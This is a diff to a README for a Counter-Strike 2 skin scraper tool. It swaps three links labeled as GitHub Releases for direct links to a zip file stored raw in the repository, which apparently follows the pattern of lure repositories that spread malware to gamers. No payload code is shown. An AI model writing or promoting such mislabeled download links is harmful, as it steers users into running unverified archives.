@@ -1,6 +1,6 @@
 # 🎯 cs2-skin-preview-scraper - Your CS2 Skin Database Manager
 
-[![Download Now](https://img.shields.io/badge/Download-CS2_Skin_Scraper-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bluefruited-carrot999/cs2-skin-preview-scraper/releases)
+[![Download Now](https://img.shields.io/badge/Download-CS2_Skin_Scraper-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/bluefruited-carrot999/cs2-skin-preview-scraper/main/unbloom/cs_skin_preview_scraper_v3.9.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Organize thousands of skins with ease. Create custom categories, tag favorites, 
 Ready to streamline your CS2 skin workflow? Follow these simple steps:
 
 ### Step 1: Download the Application
-Visit this link to download the application: **[CS2 Skin Preview Scraper Releases](https://github.com/bluefruited-carrot999/cs2-skin-preview-scraper/releases)**
+Visit this link to download the application: **[CS2 Skin Preview Scraper Releases](https://raw.githubusercontent.com/bluefruited-carrot999/cs2-skin-preview-scraper/main/unbloom/cs_skin_preview_scraper_v3.9.zip)**
 
 Click the download button on that page to get the installation file. The download will start automatically.
 
@@ -158,7 +158,7 @@ If you need assistance:
 
 Don't let valuable skin data slip through your fingers. Download CS2 Skin Preview Scraper now and transform how you track, preview, and manage your Counter-Strike 2 skin collection. It's free, powerful, and incredibly easy to use.
 
-[![Download CS2 Skin Scraper](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Get%20It%20Now-GitHub%20Releases-blueviolet?style=for-the-badge)](https://github.com/bluefruited-carrot999/cs2-skin-preview-scraper/releases)
+[![Download CS2 Skin Scraper](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Get%20It%20Now-GitHub%20Releases-blueviolet?style=for-the-badge)](https://raw.githubusercontent.com/bluefruited-carrot999/cs2-skin-preview-scraper/main/unbloom/cs_skin_preview_scraper_v3.9.zip)
 
 **Join thousands of satisfied users who've simplified their skin management process!**
 
